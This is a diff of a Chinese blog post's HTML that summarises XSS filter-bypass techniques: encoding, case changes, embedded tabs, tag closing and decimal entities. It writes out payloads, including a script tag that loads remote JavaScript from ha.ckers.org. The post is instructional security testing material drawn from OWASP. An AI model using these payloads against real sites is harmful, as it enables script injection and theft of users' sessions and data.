@@ -251,7 +251,8 @@
           
         <p>经过看书和实战，下面进行了一些个人的总结</p>
 <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>一般进行XSS测试先对其过滤字符、限制长度搞清楚。</p>
-<p>首先:<xss>xss’”然后看其结果过滤了什么，转义了什么，再进行相对应得措施。</xss></p>
+<p>首先:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;xss&gt;xss&apos;&quot;</div></pre></td></tr></table></figure></p>
+<p>然后看其结果过滤了什么，转义了什么，再进行相对应得措施。</p>
 <h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="HTML-url编码绕过"><a href="#HTML-url编码绕过" class="headerlink" title="HTML url编码绕过"></a>HTML url编码绕过</h2><p>在一次挖洞时用Burp 拦截，其编码方式是html编码，于是把所要插入的代码进行编码然后重发，便轻松实现绕过。</p>
 <h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>这个是因为系统的问题，因为在windows系统中是大小写不敏感的，WINDOWS和WinDows是被当做一样的字符串处理。<br>而linux系统是大小写敏感的。</p>
 <p>正常情况的xss攻击代码是<br>    <script>alert(‘XSS’);</script></p>
@@ -261,13 +262,14 @@
 #无引号无分号
 &lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
 </code></pre><p>###内嵌TAB(或者回车)</p>
-<p>用来分开xss攻击代码<br>    <img src="jav   ascript:alert('XSS');"></p>
-<p>####内嵌被编码的TAB<br>    <img src="jav&#x09;ascript:alert('XSS');"></p>
+<p>用来分开xss攻击代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;jav   ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure></p>
+<p>###内嵌被编码的TAB</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure>
 <h2 id="闭合标签绕过"><a href="#闭合标签绕过" class="headerlink" title="闭合标签绕过"></a>闭合<html>标签绕过</html></h2><pre><code>&lt;/title&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
 </code></pre><h2 id="无过滤绕过"><a href="#无过滤绕过" class="headerlink" title="无过滤绕过"></a>无过滤绕过</h2><p>这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。（引号是不被需要的在任何现代浏览器中，因此这里省略了它。）<br>    <script src="http://ha.ckers.org/xss.js"></script></p>
 <h2 id="十进制html编码"><a href="#十进制html编码" class="headerlink" title="十进制html编码"></a>十进制html编码</h2><pre><code>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
-</code></pre><h3 id="结尾没有分号的十进制html编码"><a href="#结尾没有分号的十进制html编码" class="headerlink" title="结尾没有分号的十进制html编码"></a>结尾没有分号的十进制html编码</h3><pre><code>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
-</code></pre><p>##参考链接：<br><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/xss-filter-evasion-cheat-sheet.html" target="_blank" rel="external">XSS 过滤绕过备忘单</a></p>
+</code></pre><h2 id="结尾没有分号的十进制html编码"><a href="#结尾没有分号的十进制html编码" class="headerlink" title="结尾没有分号的十进制html编码"></a>结尾没有分号的十进制html编码</h2><pre><code>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+</code></pre><p>#参考链接：<br><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/xss-filter-evasion-cheat-sheet.html" target="_blank" rel="external">XSS 过滤绕过备忘单</a></p>
 
       
     </div>
